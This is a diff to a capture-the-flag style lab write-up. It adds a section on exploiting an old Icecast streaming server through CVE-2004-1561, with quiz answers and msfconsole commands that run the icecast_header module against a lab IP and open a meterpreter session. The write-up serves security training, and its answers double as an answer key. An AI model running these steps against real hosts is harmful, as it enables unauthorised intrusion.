@@ -64,9 +64,47 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 124.17 seconds
 ```
 
-### Step 2
+### Gain Access
 
-[Description of second step goes here]
+This machine is using a vulnerable version of Icecast which is a streaming media server.
+
+```
+1. What type of vulnerability does Icecast use ? https://www.cvedetails.com/cve/CVE-2004-1561/
+Execute Code Overflow
+
+2. What is the CVE number for this vulnerability?
+CVE-2004-1561
+An exploit can be found on exploit-db here: https://www.exploit-db.com/exploits/568
+
+```
+
+Using msfconsole for exploitation
+```
+$ msfconsole
+msf5 > search icecast
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+
+msf5 > use 0
+msf5 exploit(windows/http/icecast_header) > run RHOSTS=10.10.58.222
+...
+meterpreter >
+```
+
+```
+3. What is the full path (starting with exploit) for the exploitation module?
+exploit/windows/http/icecast_header
+
+4. What is the only required setting which currently is blank?
+rhosts
+
+```
+
+
 
 ### Step 3
 
